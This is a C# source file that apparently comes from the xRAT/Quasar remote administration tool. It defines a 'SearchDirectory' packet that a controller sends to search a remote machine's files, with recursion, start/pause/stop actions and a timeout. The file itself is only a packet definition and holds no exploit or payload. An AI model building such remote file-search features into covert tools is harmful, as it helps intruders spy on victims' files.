using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    public enum ActionType
    {
        Begin,
        Pause,
        Stop
    }

    public enum TimeoutType
    {
        Milliseconds,
        Seconds,
        Minutes
    }

    [Serializable]
    public class SearchDirectory : IPacket
    {
        public string BaseDirectory { get; set; }

        public bool Recursive { get; set; }

        public string SearchString { get; set; }

        public ActionType ActionType { get; set; }

        public TimeoutType TimeoutType { get; set; }

        public int Timeout { get; set; }

        public SearchDirectory()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}